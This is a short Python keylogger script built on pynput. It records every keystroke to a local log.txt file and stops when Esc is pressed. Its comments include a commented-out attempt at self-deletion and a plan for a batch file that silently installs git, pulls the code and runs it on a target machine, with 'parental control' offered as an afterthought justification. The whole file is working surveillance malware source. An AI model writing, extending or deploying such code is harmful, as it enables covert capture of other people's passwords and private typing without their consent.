import pynput
from pynput.keyboard import Key,Listener
import webbrowser
import os, atexit



#keylogger

with open("log.txt","a") as f:
    f.write("\n")

count = 0
keys = []
i=0



def on_press(key):
    global count, keys,i


    keys.append(key)
    count += 1
    i+=1
    print(format(key))

    if count>=3:
        count=0
        write_file(keys)
        keys = []




def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'", "")
            l=len(k)
            if k.find ("enter") > 0:
                f.write("\n")
            elif k.find("backspace")>0:
                f.write("[backspace]")
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find ("Key") == -1:
                f.write(k)
            elif k.find("esc") > 0:
                f.write("\n")
            elif k.find("right") > 0:
                f.write("[right key]")
            elif k.find("left") > 0:
                f.write("[left key]")

#for stopping everything
def on_release(key):
    if key == Key.esc:
        return False
        #return True
        # os.remove("PyKey.py")#deleting file that didnt work? wat

#calling all functions
with Listener(on_press=on_press, on_release=on_release)as listener:
    listener.join()


#make a batch file that installs git(how tf....?) and pulls the code and runs it(run u need to figure out.)
#ethical:add a pw for this so that it can work as a parental control thing.


